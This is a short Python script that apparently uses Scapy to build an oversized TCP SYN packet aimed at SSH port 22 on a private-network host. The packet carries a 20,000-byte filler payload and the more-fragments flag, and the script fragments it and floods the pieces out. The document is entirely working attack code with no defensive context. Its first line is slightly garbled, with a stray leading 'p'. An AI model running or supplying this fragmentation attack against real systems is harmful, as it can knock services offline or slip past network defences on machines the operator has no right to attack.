pfrom scapy.all import *
import random


target_ip = "192.168.86.22" 
target_port = 22  


payload = b"B" * 20000  
syn_packet = (
IP(dst=target_ip, flags="MF") / TCP(dport=target_port, flags="S") / payload)

fragments = fragment(syn_packet, fragsize=512)
for f in fragments:
        print(f"Sending packet: {f}")
        send(f, verbose=0)
